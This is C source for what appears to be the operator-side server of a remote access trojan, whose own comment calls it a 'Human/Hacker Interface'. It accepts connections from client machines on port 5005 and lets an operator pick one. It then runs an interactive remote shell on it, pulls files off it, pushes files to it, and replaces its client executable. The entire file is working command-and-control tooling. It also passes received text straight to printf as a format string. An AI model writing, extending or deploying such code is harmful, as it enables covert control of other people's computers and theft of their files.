#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include "eaSCKTBasicComProtocols.h"

#define PORT 5005

void * threadHI(void * param);
void commWithSystems(void);
void process(EAScktType sckt, const char * al);
void recvSendText(EAScktType sckt);

int c = 1;
int fd_max = 0;
fd_set master;
pthread_mutex_t lock;
EAScktType selectedClient = -1;

int main()
{
	if (eaSCKTInit() != 0)
		return EXIT_FAILURE;
	
	commWithSystems();

	eaSCKTFinish();

	return 0;
}

void * threadHI(void * param)
{
	int x, max;
	unsigned int var, input_client;
	char * al = (char *) param;
	struct sockaddr_in clientInfos;

	do {
		SLEEP(1000);
		c = 1;
		selectedClient = -1;

#ifdef _WIN32
		max = master.fd_count;
#else
		max = fd_max;
#endif

		for (var = 0; var < max; ++var)
#ifndef _WIN32
		if (FD_ISSET(var, &master))
#endif
		{
#ifdef _WIN32
			EAScktType sckt = master.fd_array[var];
#else
			EAScktType sckt = var;
#endif
			x = sizeof(struct  sockaddr);
			memset(&clientInfos, 0, sizeof(struct sockaddr_in));
			getpeername(sckt, (struct  sockaddr *)&clientInfos, &x);

			if (inet_ntoa(clientInfos.sin_addr)[0] != '0')
				printf("Client Socket : %d, Client IP %s\n", (int) sckt, inet_ntoa(clientInfos.sin_addr));
		}

		puts("\n\nEnter Socket\tConnect client\tEnter 0 for Refresh");
		scanf("%u", &input_client);
		c = 0;
		CLEAR_TERMINAL();

		if (!input_client) continue;

		for (var = 0; var < max; ++var)
		{
#ifndef _WIN32
			if (FD_ISSET(var, &master))
#endif
#ifdef _WIN32
			if (master.fd_array[var] == input_client)
#else
			if (var == input_client)
#endif
			{
				selectedClient = input_client;
				break;
			}
		}

		if (selectedClient != -1)
		{
			puts("Command List\n1- cmd\n2- getFile <Path>\n3- sendFile <Path>\n4- update <NewClientExe>\n\n");
			fgets(al, 300, stdin);
			al[strlen(al) - 1] = 0;
			senderText(selectedClient, al);
			process(selectedClient, al);
			CLEAR_TERMINAL();
		}
	} while (1);

	return NULL;
}

void commWithSystems(void)
{
	int i;
	pthread_t th;
	fd_set sockets;
	char al[1024] = {0};
	EAScktType newClient, server;
	struct sockaddr_in myInfos, clientInfos;

	/*
	 * Create TCP Socket
	 */
	if (SCKT_ERR == (server = socket(AF_INET, SOCK_STREAM, 0)))
	{
		SCKT_DEBUG("socket");
		return;
	}

	/*
	 * Fill "sockaddr_in" struct
	 */
	myInfos.sin_family = AF_INET;
	myInfos.sin_port = htons(PORT);
	myInfos.sin_addr.s_addr = INADDR_ANY;
	memset(myInfos.sin_zero, 0, 8);

	/*
	 * Bind socket
	 */
	if (SCKT_ERR == bind(server, (struct  sockaddr *)&myInfos, sizeof(struct sockaddr)))
	{
		SCKT_DEBUG("bind");
		eaSCKTClose(server);
		return;
	}

	/*
	 * Listen config
	 */
	if (SCKT_ERR == listen(server, 10))
	{
		SCKT_DEBUG("listen");
		eaSCKTClose(server);
		return;
	}

	/*
	 * FD_SET config
	 */
	FD_ZERO(&master);
	FD_ZERO(&sockets);
	FD_SET(server, &master);
#ifndef _WIN32
	fd_max = server + 1;
#endif

	/*
	 * Create Thread Clients For Human/Hacker Interface :D
	 */
	pthread_create(&th, NULL, threadHI, al);
	pthread_detach(th);

	/*
	 * For Clients
	 */
	for(;;)
	{
		sockets = master;

		if (SCKT_ERR == select(fd_max, &sockets, NULL, NULL, NULL))
		{
			SCKT_DEBUG("select");
			break;
		}

#ifdef _WIN32
		newClient = sockets.fd_array[0];
#else	// https://gist.github.com/cwgem/1203534/9e3cf38bf7dee2ba14795f72973e02596c09a48e
		for (newClient = 0; newClient < fd_max; newClient++)
			if (FD_ISSET(newClient, &sockets))
#endif

		if (newClient == server)
		{
			i = sizeof(clientInfos);
			if (SCKT_ERR != (newClient = accept(server, (struct  sockaddr *)&clientInfos, &i)))
			{

				FD_SET(newClient, &master);
#ifndef _WIN32
				if (newClient > fd_max)
					fd_max = newClient + 1;
#endif
			}
		}
		else
		{
			if ((selectedClient != newClient) || c)
			{
				FD_CLR(newClient, &master);
				eaSCKTClose(newClient);
			}
		}
	}

	eaSCKTClose(server);
}

void process(EAScktType sckt, const char * al)
{
	if (strncmp(al, "cmd", 3) == 0)
	{
		recvSendText(sckt);
	}
	else if (strncmp(al, "getFile ", 8) == 0)
	{
		free(recverFile(sckt));
	}
	else if (strncmp(al, "sendFile ", 9) == 0)
	{
		senderFile(sckt, al + 9);
	}
	else if (strncmp(al, "update ", 7) == 0)
	{
		senderFile(sckt, al + 7);
	}
}

void recvSendText(EAScktType sckt)
{
	char * buffer;
	char input[300 + 1] = { 0 };

	while (1)
	{
		if ((buffer = recverText(sckt)) == NULL)
			break;

		if (strcmp(buffer, "_Error_") == 0)
		{
			free(buffer);
			break;
		}

		printf(buffer);
		free(buffer);

		fgets(input, 300, stdin);
		senderText(sckt, input);
	}
}
